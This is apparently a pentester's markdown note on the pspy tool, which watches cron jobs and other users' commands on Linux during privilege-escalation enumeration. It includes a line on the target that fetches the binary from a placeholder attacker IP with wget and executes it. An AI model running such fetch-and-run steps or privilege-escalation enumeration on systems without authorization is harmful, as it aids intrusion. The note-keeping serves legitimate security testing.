---
tags: [tool, privesc, linux, monitor]
tool: "pspy"
category: "Privesc"
installed: true
phase: [enumeration, privesc]
---

# pspy - Process Monitor

## Tool Overview
Purpose: Monitor processes, cron jobs, and commands in real-time without root
Location: ~/tools/privesc/linux/pspy64 and ~/tools/privesc/linux/pspy32

## When to Use
- To see cron jobs as they run
- To monitor commands executed by other users
- To find temporary file races

## How to Use It

Basic Monitoring:
./pspy64

Watch with Filters:
./pspy64 -pf -i 1000

Show Timestamps:
./pspy64 -pf -i 1000 -t

Monitor Specific Users:
./pspy64 -u root

Background Monitoring:
./pspy64 -pf -i 1000 > pspy.log &
tail -f pspy.log

Transfer to Target:
On Kali: cd ~/tools/privesc/linux && python3 -m http.server 8000
On target: wget http://YOUR_IP:8000/pspy64 && chmod +x pspy64 && ./pspy64

## Options
-p : Print commands
-f : Print file system events
-i : Check interval (ms)
-t : Print timestamps
-u : Monitor specific user

## Related Tools
linpeas, lse, les
